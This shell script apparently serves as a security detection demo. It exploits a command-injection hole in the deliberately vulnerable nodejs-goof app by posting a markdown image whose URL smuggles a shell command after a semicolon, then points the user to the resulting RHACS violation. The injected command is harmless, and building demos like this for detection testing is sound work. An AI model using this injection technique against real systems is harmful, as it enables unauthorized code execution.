#!/bin/sh
# Simulate the command-injection RCE already built into nodejs-goof so RHACS
# can record it. POST /create accepts a markdown image snippet. The app extracts
# the URL and runs it with child_process.exec("identify " + url), which uses a
# shell. A semicolon in that URL makes the Node process spawn /bin/sh.
#
# The spawned command is `apt-get --version`. That is enough for the default
# RHACS policy "Ubuntu Package Manager Execution", and the violation shows a
# node -> sh -> apt-get lineage. Output is written to /tmp/acs-node-rce-sim
# inside the container. Nothing is installed and no listener is opened.
#
# Usage:
#   ./nodejs-rce-attack.sh [namespace] [service]
#   NODEJS_GOOF_URL=https://nodejs-goof-vuln-main.apps.example.com ./nodejs-rce-attack.sh
#
# Only run this against the nodejs-goof demo workload in a cluster you are
# authorized to test.
set -eu

namespace="${1:-nodejs-goof-vuln-main}"
service="${2:-nodejs-goof-vuln-main}"
local_port="${NODEJS_RCE_LOCAL_PORT:-3001}"
command='apt-get --version >/tmp/acs-node-rce-sim 2>&1'
payload="![alt text](http://127.0.0.1/; ${command} \"acs-node-rce\")"

pf_pid=""
cleanup() {
    if [ -n "$pf_pid" ]; then
        kill "$pf_pid" 2>/dev/null || true
    fi
}
trap cleanup EXIT INT TERM

base_url="${NODEJS_GOOF_URL:-}"
if [ -z "$base_url" ]; then
    echo "Forwarding traffic to service/${service} in ${namespace}..."
    kubectl port-forward -n "$namespace" "service/${service}" "${local_port}:80" >/dev/null 2>&1 &
    pf_pid="$!"
    sleep 5
    base_url="http://127.0.0.1:${local_port}"
fi

base_url="${base_url%/}"
echo "Posting the Node.js command-injection payload to ${base_url}/create"
echo "The app will run: identify http://127.0.0.1/; ${command}"

curl -sS -k -i \
    -X POST \
    --data-urlencode "content=${payload}" \
    "${base_url}/create" || true

echo
echo "In RHACS, open Violations for deployment/nodejs-goof-vuln-main."
echo "Expect Ubuntu Package Manager Execution, with process lineage node -> sh -> apt-get."
echo "The command output is in the container at /tmp/acs-node-rce-sim."
